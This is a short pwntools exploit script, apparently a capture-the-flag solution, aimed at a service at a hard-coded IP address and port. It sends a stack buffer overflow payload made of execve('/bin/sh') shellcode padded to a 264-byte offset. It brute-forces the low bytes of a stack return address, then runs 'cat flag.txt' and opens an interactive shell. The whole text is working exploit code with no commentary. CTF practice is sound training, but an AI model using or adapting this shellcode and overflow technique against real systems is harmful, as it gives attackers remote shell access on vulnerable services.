from pwn import *

context.log_level = 'error'

p = remote('117.53.46.98', 10000)

offset = 264

shellcode = (
    b"\x48\x31\xf6"
    b"\x56"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x57"
    b"\x48\x89\xe7"
    b"\x48\x31\xd2"
    b"\x48\x31\xc0"
    b"\xb0\x3b"
    b"\x0f\x05"
)

payload = shellcode.ljust(offset, b'A')

# Brute-force low 2 bytes
base = 0x7fffffffd000
for last in range(0x00, 0xff, 0x10):
    addr = base + last
    log.info(f"Trying address: {hex(addr)}")
    try:
        p = remote('117.53.46.98', 10000)
        p.sendlineafter(b"pwning from the start okay?", payload + p64(addr))
        p.sendline(b'cat flag.txt')
        out = p.recv(timeout=1)
        if out:
            print(out)
            p.interactive()
            break
        p.close()
    except:
        p.close()
